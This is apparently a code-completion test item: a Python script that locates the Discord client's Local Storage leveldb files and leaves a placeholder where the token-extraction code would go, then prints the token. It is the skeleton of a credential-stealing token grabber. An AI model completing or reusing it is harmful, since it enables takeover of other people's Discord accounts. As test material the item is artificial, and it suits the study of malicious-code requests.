import os
import sqlite3
import base64
import json
from pathlib import Path

def find_ldb_file():
    """
    Searches for the local storage file (ldb file) of the Discord client on the user's computer.
    Returns the path to the ldb file if found, otherwise None.
    """
    # Define the possible paths where the ldb file might be located
    possible_paths = [
        str(Path.home() / 'AppData' / 'Local' / 'Discord' / 'Local Storage' / 'leveldb'),
        str(Path.home() / 'Library' / 'Application Support' / 'discord' / 'Local Storage' / 'leveldb')
    ]

    for path in possible_paths:
        if os.path.exists(path):
            return path
    return None

def extract_token_from_ldb(ldb_path):
    # Connect to the ldb database
    # Query to find the token
    <FILL_HERE>
def main():
    ldb_path = find_ldb_file()
    if ldb_path:
        token = extract_token_from_ldb(ldb_path)
        if token:
            print(f"Discord Token: {token}")
        else:
            print("Token not found.")
    else:
        print("LDB file not found.")

if __name__ == "__main__":
    main()